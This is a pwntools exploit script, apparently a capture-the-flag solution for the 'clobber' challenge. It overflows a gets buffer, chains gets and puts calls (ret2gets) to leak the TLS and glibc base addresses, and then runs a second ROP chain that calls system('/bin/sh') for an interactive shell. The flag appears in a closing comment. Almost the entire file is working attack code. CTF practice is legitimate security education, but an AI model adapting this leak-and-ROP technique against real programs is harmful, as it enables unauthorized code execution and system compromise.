from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./clobber_patched', '''
    b *0x401064
    b *0x401074
    continue
''')

# p = remote('clobber.umbccd.net', 13373)

# 1. ROP to leak tls/glibc (ret2gets)
e = ELF('./clobber_patched')
chain1 = [
    e.plt.gets,
    e.plt.gets,
    e.plt.gets,
    e.plt.puts,
    e.sym.main,
]
p.sendline(b'a'*0x20+p64(0)+b''.join([p64(c1) for c1 in chain1]))   # main's gets
p.recvline()                                                        # main's puts
p.sendline(b'\x00')                                                 # ROP's first gets, with rdi=&_IO_stdfile_1_lock
p.sendline(p32(0)+b'A'*4+b'B'*8)                                    # ROP's second gets, with rdi=&_IO_stdfile_0_lock
p.sendline(b'C'*4)                                                  # ROP's third gets, with rdi=&_IO_stdfile_0_lock
# _IO_lock_lock in last gets: _IO_stdfile_0_lock.lock=1, _IO_stdfile_0_lock.owner=$fs_base
# _IO_lock_unlock in last gets: _IO_stdfile_0_lock.cnt--
p.recv(8)                                                           # ROP's puts, with rdi=&_IO_stdfile_0_lock
tls_base_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"tls base address: {hex(tls_base_addr)}")
glibc_base_addr = tls_base_addr+0x28c0
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. ROP to pop a shell
glibc_e = ELF('./libc.so.6')
chain2 = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+glibc_e.sym.system
]
p.sendline(b'b'*0x20+p64(0)+b''.join([p64(c2) for c2 in chain2]))   # ROP's main's gets

p.interactive()

# DawgCTF{p1v0t_4nd_cl0bb3r}